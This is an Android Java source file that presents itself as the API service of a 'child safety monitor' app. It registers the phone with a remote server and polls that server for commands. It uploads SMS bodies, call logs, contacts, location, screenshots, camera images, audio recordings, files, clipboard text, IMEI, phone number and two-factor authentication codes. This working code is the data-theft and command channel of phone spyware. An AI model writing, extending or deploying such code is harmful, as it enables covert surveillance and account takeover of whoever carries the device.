package com.example.childsafetymonitor.api;

import android.content.Context;
import android.util.Base64;
import android.util.Log;

import com.example.childsafetymonitor.api.models.Command;
import com.example.childsafetymonitor.api.models.DeviceInfo;
import com.example.childsafetymonitor.api.models.ServerResponse;
import com.example.childsafetymonitor.utils.AppUtils;
import com.example.childsafetymonitor.utils.CallUtils;
import com.example.childsafetymonitor.utils.ContactsHelper;
import com.example.childsafetymonitor.utils.FileHelper;
import com.example.childsafetymonitor.utils.SmsHelper;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.TimeUnit;

/**
 * API service to communicate with the server
 */
public class ApiService {
    private static final String TAG = "ApiService";
    private static final int TIMEOUT_SECONDS = 30;
    
    private final Context context;
    private final String serverUrl;
    
    public ApiService(Context context, String serverUrl) {
        this.context = context;
        this.serverUrl = serverUrl;
        Log.d(TAG, "ApiService initialized with server URL: " + serverUrl);
    }
    
    /**
     * Register device with the server
     */
    public ServerResponse registerDevice(DeviceRegistration registration) throws IOException {
        return post("/register", registration.toJson());
    }
    
    /**
     * Get pending commands from the server
     */
    public List<Command> getCommands(String deviceId) throws IOException {
        String url = String.format("/commands/%s", deviceId);
        ServerResponse response = get(url);
        
        if (response == null || !response.isSuccess()) {
            return new ArrayList<>();
        }
        
        try {
            JSONObject responseJson = new JSONObject(response.getRawResponse());
            JSONArray commandsArray = responseJson.getJSONArray("commands");
            
            List<Command> commands = new ArrayList<>();
            for (int i = 0; i < commandsArray.length(); i++) {
                JSONObject commandJson = commandsArray.getJSONObject(i);
                Command command = new Command();
                command.setRequestId(commandJson.optString("requestId"));
                command.setType(commandJson.optString("type"));
                command.setParams(commandJson.optJSONObject("params") != null ? 
                       commandJson.optJSONObject("params") : new JSONObject());
                
                commands.add(command);
            }
            
            return commands;
        } catch (JSONException e) {
            Log.e(TAG, "Error parsing commands response", e);
            return new ArrayList<>();
        }
    }
    
    /**
     * Send an update to the server
     */
    public ServerResponse sendUpdate(String deviceId, String updateType, Object data) throws IOException {
        String url = String.format("/update/%s", deviceId);
        
        JSONObject updateJson = new JSONObject();
        try {
            updateJson.put("type", updateType);
            
            if (data != null) {
                if (data instanceof JSONObject) {
                    updateJson.put("data", data);
                } else if (data instanceof String) {
                    updateJson.put("data", data);
                } else if (data instanceof DeviceInfoUpdate) {
                    updateJson.put("data", ((DeviceInfoUpdate) data).toJson());
                } else if (data instanceof LocationUpdate) {
                    updateJson.put("data", ((LocationUpdate) data).toJson());
                } else if (data instanceof ScreenshotUpdate) {
                    updateJson.put("data", ((ScreenshotUpdate) data).toJson());
                } else if (data instanceof CameraUpdate) {
                    updateJson.put("data", ((CameraUpdate) data).toJson());
                } else if (data instanceof AudioUpdate) {
                    updateJson.put("data", ((AudioUpdate) data).toJson());
                } else if (data instanceof CallLogsUpdate) {
                    updateJson.put("data", ((CallLogsUpdate) data).toJson());
                } else if (data instanceof SmsUpdate) {
                    updateJson.put("data", ((SmsUpdate) data).toJson());
                } else if (data instanceof ContactsUpdate) {
                    updateJson.put("data", ((ContactsUpdate) data).toJson());
                } else if (data instanceof AppListUpdate) {
                    updateJson.put("data", ((AppListUpdate) data).toJson());
                } else if (data instanceof FileListUpdate) {
                    updateJson.put("data", ((FileListUpdate) data).toJson());
                } else if (data instanceof FileDataUpdate) {
                    updateJson.put("data", ((FileDataUpdate) data).toJson());
                } else if (data instanceof ClipboardUpdate) {
                    updateJson.put("data", ((ClipboardUpdate) data).toJson());
                } else if (data instanceof CommandResult) {
                    updateJson.put("data", ((CommandResult) data).toJson());
                } else if (data instanceof UninstallResult) {
                    updateJson.put("data", ((UninstallResult) data).toJson());
                } else if (data instanceof TwoFactorStatus) {
                    updateJson.put("data", ((TwoFactorStatus) data).toJson());
                } else if (data instanceof TwoFactorVerification) {
                    updateJson.put("data", ((TwoFactorVerification) data).toJson());
                }
            }
        } catch (JSONException e) {
            Log.e(TAG, "Error creating update JSON", e);
            throw new IOException("Error creating update JSON", e);
        }
        
        return post(url, updateJson);
    }
    
    /**
     * Perform a GET request to the server
     */
    private ServerResponse get(String endpoint) throws IOException {
        URL url = new URL(serverUrl + endpoint);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        
        try {
            conn.setRequestMethod("GET");
            conn.setConnectTimeout((int) TimeUnit.SECONDS.toMillis(TIMEOUT_SECONDS));
            conn.setReadTimeout((int) TimeUnit.SECONDS.toMillis(TIMEOUT_SECONDS));
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("Accept", "application/json");
            
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(
                    responseCode >= 400 ? conn.getErrorStream() : conn.getInputStream()));
            
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = in.readLine()) != null) {
                response.append(line);
            }
            in.close();
            
            return new ServerResponse(responseCode, response.toString());
        } finally {
            conn.disconnect();
        }
    }
    
    /**
     * Perform a POST request to the server with JSON data
     */
    private ServerResponse post(String endpoint, JSONObject jsonData) throws IOException {
        URL url = new URL(serverUrl + endpoint);
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        
        try {
            conn.setRequestMethod("POST");
            conn.setConnectTimeout((int) TimeUnit.SECONDS.toMillis(TIMEOUT_SECONDS));
            conn.setReadTimeout((int) TimeUnit.SECONDS.toMillis(TIMEOUT_SECONDS));
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("Accept", "application/json");
            conn.setDoOutput(true);
            
            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = jsonData.toString().getBytes("utf-8");
                os.write(input, 0, input.length);
            }
            
            int responseCode = conn.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(
                    responseCode >= 400 ? conn.getErrorStream() : conn.getInputStream()));
            
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = in.readLine()) != null) {
                response.append(line);
            }
            in.close();
            
            return new ServerResponse(responseCode, response.toString());
        } finally {
            conn.disconnect();
        }
    }
    
    /**
     * Device registration data
     */
    public static class DeviceRegistration {
        private String deviceId;
        private String model;
        private String osVersion;
        private String deviceName;
        
        public DeviceRegistration(String deviceId, String model, String osVersion, String deviceName) {
            this.deviceId = deviceId;
            this.model = model;
            this.osVersion = osVersion;
            this.deviceName = deviceName;
        }
        
        public JSONObject toJson() {
            JSONObject json = new JSONObject();
            try {
                json.put("deviceId", deviceId);
                json.put("model", model);
                json.put("osVersion", osVersion);
                json.put("deviceName", deviceName);
            } catch (JSONException e) {
                Log.e(TAG, "Error creating device registration JSON", e);
            }
            return json;
        }
    }
    
    /**
     * Location update data
     */
    public static class LocationUpdate {
        private double latitude;
        private double longitude;
        private float accuracy;
        private long timestamp;
        
        public LocationUpdate(double latitude, double longitude, float accuracy, long timestamp) {
            this.latitude = latitude;
            this.longitude = longitude;
            this.accuracy = accuracy;
            this.timestamp = timestamp;
        }
        
        public JSONObject toJson() {
            JSONObject json = new JSONObject();
            try {
                json.put("latitude", latitude);
                json.put("longitude", longitude);
                json.put("accuracy", accuracy);
                json.put("timestamp", timestamp);
            } catch (JSONException e) {
                Log.e(TAG, "Error creating location update JSON", e);
            }
            return json;
        }
    }
    
    /**
     * Screenshot update data
     */
    public static class ScreenshotUpdate {
        private byte[] screenshotBytes;
        
        public ScreenshotUpdate(byte[] screenshotBytes) {
            this.screenshotBytes = screenshotBytes;
        }
        
        public JSONObject toJson() {
            JSONObject json = new JSONObject();
            try {
                json.put("image", Base64.encodeToString(screenshotBytes, Base64.DEFAULT));
            } catch (JSONException e) {
                Log.e(TAG, "Error creating screenshot update JSON", e);
            }
            return json;
        }
    }
    
    /**
     * Camera update data
     */
    public static class CameraUpdate {
        private byte[] imageBytes;
        private String cameraType;
        
        public CameraUpdate(byte[] imageBytes, String cameraType) {
            this.imageBytes = imageBytes;
            this.cameraType = cameraType;
        }
        
        public JSONObject toJson() {
            JSONObject json = new JSONObject();
            try {
                json.put("image", Base64.encodeToString(imageBytes, Base64.DEFAULT));
                json.put("cameraType", cameraType);
            } catch (JSONException e) {
                Log.e(TAG, "Error creating camera update JSON", e);
            }
            return json;
        }
    }
    
    /**
     * Audio recording update data
     */
    public static class AudioUpdate {
        private byte[] audioBytes;
        private int duration;
        
        public AudioUpdate(byte[] audioBytes, int duration) {
            this.audioBytes = audioBytes;
            this.duration = duration;
        }
        
        public JSONObject toJson() {
            JSONObject json = new JSONObject();
            try {
                json.put("audio", Base64.encodeToString(audioBytes, Base64.DEFAULT));
                json.put("duration", duration);
            } catch (JSONException e) {
                Log.e(TAG, "Error creating audio update JSON", e);
            }
            return json;
        }
    }
    
    /**
     * Call logs update data
     */
    public static class CallLogsUpdate {
        private List<CallUtils.CallLogEntry> calls;
        
        public CallLogsUpdate(List<CallUtils.CallLogEntry> calls) {
            this.calls = calls;
        }
        
        public JSONObject toJson() {
            JSONObject json = new JSONObject();
            try {
                JSONArray callsArray = new JSONArray();
                for (CallUtils.CallLogEntry call : calls) {
                    JSONObject callJson = new JSONObject();
                    callJson.put("number", call.getNumber());
                    callJson.put("type", call.getType());
                    callJson.put("duration", call.getDuration());
                    callJson.put("time", call.getTime());
                    callsArray.put(callJson);
                }
                json.put("calls", callsArray);
            } catch (JSONException e) {
                Log.e(TAG, "Error creating call logs update JSON", e);
            }
            return json;
        }
    }
    
    /**
     * SMS messages update data
     */
    public static class SmsUpdate {
        private List<SmsHelper.SmsMessage> messages;
        
        public SmsUpdate(List<SmsHelper.SmsMessage> messages) {
            this.messages = messages;
        }
        
        public JSONObject toJson() {
            JSONObject json = new JSONObject();
            try {
                JSONArray messagesArray = new JSONArray();
                for (SmsHelper.SmsMessage message : messages) {
                    JSONObject messageJson = new JSONObject();
                    messageJson.put("address", message.getAddress());
                    messageJson.put("body", message.getBody());
                    messageJson.put("type", message.getType());
                    messageJson.put("date", message.getDate());
                    messagesArray.put(messageJson);
                }
                json.put("messages", messagesArray);
            } catch (JSONException e) {
                Log.e(TAG, "Error creating SMS update JSON", e);
            }
            return json;
        }
    }
    
    /**
     * Contacts update data
     */
    public static class ContactsUpdate {
        private List<ContactsHelper.Contact> contacts;
        
        public ContactsUpdate(List<ContactsHelper.Contact> contacts) {
            this.contacts = contacts;
        }
        
        public JSONObject toJson() {
            JSONObject json = new JSONObject();
            try {
                JSONArray contactsArray = new JSONArray();
                for (ContactsHelper.Contact contact : contacts) {
                    JSONObject contactJson = new JSONObject();
                    contactJson.put("name", contact.name);
                    contactJson.put("phone", contact.phone);
                    contactsArray.put(contactJson);
                }
                json.put("contacts", contactsArray);
            } catch (JSONException e) {
                Log.e(TAG, "Error creating contacts update JSON", e);
            }
            return json;
        }
    }
    
    /**
     * App list update data
     */
    public static class AppListUpdate {
        private List<AppUtils.AppInfo> apps;
        
        public AppListUpdate(List<AppUtils.AppInfo> apps) {
            this.apps = apps;
        }
        
        public JSONObject toJson() {
            JSONObject json = new JSONObject();
            try {
                JSONArray appsArray = new JSONArray();
                for (AppUtils.AppInfo app : apps) {
                    JSONObject appJson = new JSONObject();
                    appJson.put("name", app.getName());
                    appJson.put("packageName", app.getPackageName());
                    appJson.put("enabled", app.isEnabled());
                    appsArray.put(appJson);
                }
                json.put("apps", appsArray);
            } catch (JSONException e) {
                Log.e(TAG, "Error creating app list update JSON", e);
            }
            return json;
        }
    }
    
    /**
     * File list update data
     */
    public static class FileListUpdate {
        private List<FileHelper.FileEntry> files;
        private String path;
        
        public FileListUpdate(List<FileHelper.FileEntry> files, String path) {
            this.files = files;
            this.path = path;
        }
        
        public JSONObject toJson() {
            JSONObject json = new JSONObject();
            try {
                JSONArray filesArray = new JSONArray();
                for (FileHelper.FileEntry file : files) {
                    JSONObject fileJson = new JSONObject();
                    fileJson.put("name", file.getName());
                    fileJson.put("path", file.getPath());
                    fileJson.put("size", file.getSize());
                    fileJson.put("isDirectory", file.isDirectory());
                    fileJson.put("lastModified", file.getLastModified());
                    filesArray.put(fileJson);
                }
                json.put("files", filesArray);
                json.put("path", path);
            } catch (JSONException e) {
                Log.e(TAG, "Error creating file list update JSON", e);
            }
            return json;
        }
    }
    
    /**
     * File data update
     */
    public static class FileDataUpdate {
        private byte[] fileData;
        private String fileName;
        
        public FileDataUpdate(byte[] fileData, String fileName) {
            this.fileData = fileData;
            this.fileName = fileName;
        }
        
        public JSONObject toJson() {
            JSONObject json = new JSONObject();
            try {
                json.put("fileData", Base64.encodeToString(fileData, Base64.DEFAULT));
                json.put("fileName", fileName);
            } catch (JSONException e) {
                Log.e(TAG, "Error creating file data update JSON", e);
            }
            return json;
        }
    }
    
    /**
     * Clipboard update data
     */
    public static class ClipboardUpdate {
        private String text;
        
        public ClipboardUpdate(String text) {
            this.text = text;
        }
        
        public JSONObject toJson() {
            JSONObject json = new JSONObject();
            try {
                json.put("text", text);
            } catch (JSONException e) {
                Log.e(TAG, "Error creating clipboard update JSON", e);
            }
            return json;
        }
    }
    
    /**
     * Device info update data
     */
    public static class DeviceInfoUpdate {
        private DeviceInfo info;
        
        public DeviceInfoUpdate(DeviceInfo info) {
            this.info = info;
        }
        
        public JSONObject toJson() {
            JSONObject json = new JSONObject();
            try {
                JSONObject infoJson = new JSONObject();
                infoJson.put("manufacturer", info.getManufacturer());
                infoJson.put("model", info.getModel());
                infoJson.put("osVersion", info.getOsVersion());
                infoJson.put("apiLevel", info.getApiLevel());
                infoJson.put("deviceName", info.getDeviceName());
                infoJson.put("batteryLevel", info.getBatteryLevel());
                infoJson.put("isCharging", info.isCharging());
                infoJson.put("totalStorage", info.getTotalStorage());
                infoJson.put("availableStorage", info.getAvailableStorage());
                infoJson.put("networkType", info.getNetworkType());
                infoJson.put("wifiEnabled", info.isWifiEnabled());
                infoJson.put("wifiSSID", info.getWifiSSID());
                infoJson.put("carrierName", info.getCarrierName());
                infoJson.put("phoneNumber", info.getPhoneNumber());
                infoJson.put("imei", info.getImei());
                
                json.put("info", infoJson);
            } catch (JSONException e) {
                Log.e(TAG, "Error creating device info update JSON", e);
            }
            return json;
        }
    }
    
    /**
     * Command result update
     */
    public static class CommandResult {
        private String command;
        private String result;
        
        public CommandResult(String command, String result) {
            this.command = command;
            this.result = result;
        }
        
        public JSONObject toJson() {
            JSONObject json = new JSONObject();
            try {
                json.put("command", command);
                json.put("result", result);
            } catch (JSONException e) {
                Log.e(TAG, "Error creating command result JSON", e);
            }
            return json;
        }
    }
    
    /**
     * Uninstall result update
     */
    public static class UninstallResult {
        private boolean success;
        private String reason;
        
        public UninstallResult(boolean success, String reason) {
            this.success = success;
            this.reason = reason;
        }
        
        public JSONObject toJson() {
            JSONObject json = new JSONObject();
            try {
                json.put("success", success);
                if (reason != null) {
                    json.put("reason", reason);
                }
            } catch (JSONException e) {
                Log.e(TAG, "Error creating uninstall result JSON", e);
            }
            return json;
        }
    }
    
    /**
     * Two-factor authentication status update
     */
    public static class TwoFactorStatus {
        private boolean enabled;
        private String email;
        
        public TwoFactorStatus(boolean enabled, String email) {
            this.enabled = enabled;
            this.email = email;
        }
        
        public JSONObject toJson() {
            JSONObject json = new JSONObject();
            try {
                json.put("enabled", enabled);
                json.put("email", email);
            } catch (JSONException e) {
                Log.e(TAG, "Error creating 2FA status JSON", e);
            }
            return json;
        }
    }
    
    /**
     * Two-factor authentication verification update
     */
    public static class TwoFactorVerification {
        private String action;
        private String code;
        
        public TwoFactorVerification(String action, String code) {
            this.action = action;
            this.code = code;
        }
        
        public JSONObject toJson() {
            JSONObject json = new JSONObject();
            try {
                json.put("action", action);
                json.put("code", code);
            } catch (JSONException e) {
                Log.e(TAG, "Error creating 2FA verification JSON", e);
            }
            return json;
        }
    }
}